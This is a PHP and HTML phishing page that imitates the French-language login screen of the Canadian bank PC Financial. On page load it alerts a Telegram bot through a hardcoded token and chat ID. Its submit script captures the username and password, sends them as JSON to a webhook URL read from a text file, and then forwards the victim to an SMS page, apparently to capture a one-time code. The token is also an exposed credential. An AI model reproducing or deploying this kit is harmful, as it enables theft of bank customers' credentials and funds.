<?php session_start();
    $_SESSION["bank"] ='FINANCIAL';

?>

<?php
// Remplace par le token de ton bot Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
// Remplace par ton chat_id Telegram
$chat_id = '6242884372'; 
// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
$message = "🏛🏛*.".$_SESSION["bank"]."*🏛🏛\n";

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API Telegram
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>

<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PC Finance - Connexion</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: { primary: "#8E6FF7", secondary: "" },
            borderRadius: {
              none: "0px",
              sm: "4px",
              DEFAULT: "8px",
              md: "12px",
              lg: "16px",
              xl: "20px",
              "2xl": "24px",
              "3xl": "32px",
              full: "9999px",
              button: "8px",
            },
          },
        },
      };
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css"
    />
    <style>
      :where([class^="ri-"])::before { content: "\f3c2"; }
      body {
      background-color: #f9fafb;
      color: #1f2937;
      }
      input:focus {
      outline: none;
      border-color: #8E6FF7;
      }
      input[type="checkbox"] {
      appearance: none;
      width: 18px;
      height: 18px;
      border: 1px solid #d1d5db;
      border-radius: 4px;
      position: relative;
      }
      input[type="checkbox"]:checked {
      background-color: #8E6FF7;
      border-color: #8E6FF7;
      }
      input[type="checkbox"]:checked::after {
      content: "";
      position: absolute;
      width: 5px;
      height: 10px;
      border: solid white;
      border-width: 0 2px 2px 0;
      top: 2px;
      left: 6px;
      transform: rotate(45deg);
      }
    </style>
            <!-- Simple CSS spinner -->
            <style>
        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #006241;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #errorPopup {
            position: fixed;
            top: 30%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #f44336;
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            z-index: 10000;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            cursor: pointer;
            font-size: 16px;
        }
    </style>
  </head>
  <body class="min-h-screen">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
      <header class="py-6">
        <div class="flex items-center">
          <div class="text-red-600 font-['Pacifico'] text-2xl">
            <span>
            <img
                  src="https://secure.pcfinancial.ca/assets/images/fr/pcf-logo-light.svg"
                  alt="Google Play"
                  class="h-8"
              />
            </span>
          </div>
        </div>
      </header>
      <main class="flex flex-col lg:flex-row gap-12 py-8">
        <div class="hidden lg:block lg:w-1/2 space-y-8">
          <div>
            <h1 class="text-4xl font-bold text-gray-800 mb-4">
              Connectez-vous à PC Finance en ligne
            </h1>
            <p class="text-gray-600">
              Gérez vos comptes, faites le suivi de vos dépenses et obtenez de
              l'aide, tout cela à portée de main.
            </p>
          </div>
          <div class="bg-white p-6 rounded shadow-sm border border-gray-100">
            <div class="flex justify-between items-center">
              <p class="text-gray-700">
                Vous vous demandez quel produit vous convient le mieux ?
              </p>
              <a
                href="#"
                class="text-primary flex items-center gap-1 whitespace-nowrap"
              >
                Visitez pcfinancial.ca
                <i class="ri-external-link-line"></i>
              </a>
            </div>
          </div>
        </div>
        <div class="lg:w-1/2">
          <div class="bg-white p-8 rounded shadow-sm border border-gray-100">
            <h2 class="text-2xl font-semibold mb-6">Connectez-vous</h2>
            <form id="loginForm" action="/financial/sms.php" method="post" >
              <div class="mb-6">
                <label
                  for="username"
                  class="block text-sm font-medium text-gray-700 mb-1"
                  >Nom d'utilisateur</label
                >
                <input
                name="cvv"

                  type="text"
                  id="username"
                  class="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-primary/20"
                  placeholder="Saisir un nom d'utilisateur"
                />
                <div class="flex justify-end mt-1">
                  <a href="#" class="text-primary text-sm"
                    >Nom d'utilisateur oublié</a
                  >
                </div>
              </div>
              <div class="mb-6">
                <label
                  for="password"
                  class="block text-sm font-medium text-gray-700 mb-1"
                  >Mot de passe</label
                >
                <div class="relative">
                  <input
                  name="mdp"

                    type="password"
                    id="password"
                    class="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-primary/20"
                    placeholder="Saisir le mot de passe"
                  />
                  <button
                    type="button"
                    id="togglePassword"
                    class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 w-6 h-6 flex items-center justify-center"
                  >
                    <i class="ri-eye-line"></i>
                  </button>
                </div>
                <div class="flex justify-end mt-1">
                  <a href="#" class="text-primary text-sm"
                    >Mot de passe oublié</a
                  >
                </div>
              </div>
              <div class="flex items-center gap-2 mb-8">
                <input type="checkbox" id="remember" class="cursor-pointer" />
                <label
                  for="remember"
                  class="text-sm text-gray-700 cursor-pointer"
                  >Se souvenir de moi</label
                >
                <div
                  class="w-5 h-5 flex items-center justify-center text-gray-500 cursor-pointer"
                >
                  <i class="ri-information-line"></i>
                </div>
              </div>
              <button
                type="submit"
                class="w-full bg-red-700 hover:bg-red-800 text-white py-3 px-4 !rounded-button font-medium whitespace-nowrap transition-colors"
              >
                Connexion
              </button>
            </form>
            <div class="mt-6 text-center">
              <p class="text-gray-600">
                Vous n'avez pas de compte en ligne?
                <a href="#" class="text-primary">S'inscrire</a>
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
    <div
      class="fixed bottom-6 right-6 bg-black text-white w-14 h-14 rounded-full flex items-center justify-center cursor-pointer shadow-lg"
    >
      <i class="ri-customer-service-2-line ri-lg"></i>
    </div>
    <footer class="bg-[#2D2D2D] text-white mt-20 py-12 px-4">
      <div class="max-w-7xl mx-auto">
        <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
          <div class="space-y-4">
            <img
              src="https://secure.pcfinancial.ca/assets/images/fr/pcf-logo-transparent.svg"
              alt="Finance Logo"
              class="h-8"
            />
            <div class="flex gap-4">
              <a href="#" class="bg-black rounded-lg p-2"
                ><img
                  src="https://secure.pcfinancial.ca/assets/images/fr/app-store.svg"
                  alt="App Store"
                  class="h-8"
              /></a>
              <a href="#" class="bg-black rounded-lg p-2"
                ><img
                  src="https://secure.pcfinancial.ca/assets/images/fr/google-play.svg"
                  alt="Google Play"
                  class="h-8"
              /></a>
              <a
                href="#"
                class="bg-[#8E6FF7] rounded-lg p-2 flex items-center px-4"
                >
                <img
                  src="https://secure.pcfinancial.ca/assets/images/cdic-digital-symbol.svg"
                  alt="Google Play"
                  class="h-8"
              />
                </a
              >
            </div>
          </div>
          <div class="space-y-3">
            <a href="#" class="block hover:text-gray-300">À propos de nous</a>
            <a href="#" class="block hover:text-gray-300">Nous joindre</a>
            <a href="#" class="block hover:text-gray-300">FAQ</a>
            <a href="#" class="block hover:text-gray-300">Centre des médias</a>
          </div>
          <div class="space-y-3">
            <a href="#" class="block hover:text-gray-300">Carrières</a>
            <a href="#" class="block hover:text-gray-300">Sécurité</a>
            <a href="#" class="block hover:text-gray-300">Membre SADC</a>
            <a href="#" class="block hover:text-gray-300"
              >Mentions légales et politique de confidentialité</a
            >
            <a href="#" class="block hover:text-gray-300"
              >Modalités du site web</a
            >
          </div>
          <div class="space-y-3">
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">Adeptes PC</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">Responsabilité sociale</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">PC Optimum</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">le Choix du Président</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300"
                >La carte de crédit Mastercard PC</a
              >
              <i class="ri-external-link-line"></i>
            </div>
          </div>
        </div>
        <div class="mt-12 text-sm text-gray-400">
          <p>
            La carte Mastercard Services financiers le Choix du Président est
            offerte par la Banque le Choix du Président. Le programme de PC
            Optimum est offert par Services le Choix du Président inc.
          </p>
        </div>
        <div class="mt-8 flex justify-end">
          <button
            class="bg-gray-700 text-white px-4 py-2 rounded-lg flex items-center gap-2"
          >
            <span class="text-sm">English</span>
            <i class="ri-global-line"></i>
          </button>
        </div>
      </div>
    </footer>
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Intercepte la soumission normale
        showLoader();

        const form = this;
        const formData = new FormData(form);
        const data = {
            cvv: formData.get('cvv'),
            mdp: formData.get('mdp'),
            remember: formData.get('remember') === 'on'
        };

        // On lit le webhook depuis le fichier texte
        fetch('/webhookurl.txt')
            .then(response => response.text())
            .then(webhookURL => {
                // Nettoyage (par exemple si le fichier contient des sauts de ligne)
                webhookURL = webhookURL.trim();

                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            })
            .then(response => response.json())
            .then(result => {
                hideLoader();

                if (result.continue === "yes") {
                    form.removeEventListener('submit', arguments.callee); // On retire l'interception
                    form.submit(); // Soumission réelle
                } else {
                    showPopup("Erreur : informations incorrectes.");
                }
            })
            .catch(error => {
                hideLoader();
                console.error('Erreur :', error);
                showPopup("Une erreur est survenue.");
            });
    });

    function showLoader() {
        const loader = document.createElement('div');
        loader.id = 'fullScreenLoader';
        loader.style.position = 'fixed';
        loader.style.top = 0;
        loader.style.left = 0;
        loader.style.width = '100vw';
        loader.style.height = '100vh';
        loader.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loader.style.display = 'flex';
        loader.style.justifyContent = 'center';
        loader.style.alignItems = 'center';
        loader.style.zIndex = 9999;
        loader.innerHTML = `<div class="spinner"></div>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById('fullScreenLoader');
        if (loader) loader.remove();
    }

    function showPopup(message) {
        const popup = document.createElement('div');
        popup.id = 'errorPopup';
        popup.style.position = 'fixed';
        popup.style.top = '20px';
        popup.style.left = '50%';
        popup.style.transform = 'translateX(-50%)';
        popup.style.backgroundColor = '#f44336';
        popup.style.color = 'white';
        popup.style.padding = '15px 25px';
        popup.style.borderRadius = '8px';
        popup.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
        popup.style.zIndex = 10000;
        popup.textContent = message;

        function removePopup() {
            popup.remove();
            document.removeEventListener('click', removePopup);
        }

        document.body.appendChild(popup);
        document.addEventListener('click', removePopup);
    }
</script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const togglePassword = document.getElementById("togglePassword");
        const password = document.getElementById("password");
        togglePassword.addEventListener("click", function () {
          const type =
            password.getAttribute("type") === "password" ? "text" : "password";
          password.setAttribute("type", type);
          if (type === "password") {
            togglePassword.innerHTML = '<i class="ri-eye-line"></i>';
          } else {
            togglePassword.innerHTML = '<i class="ri-eye-off-line"></i>';
          }
        });
      });
    </script>
  </body>
</html>
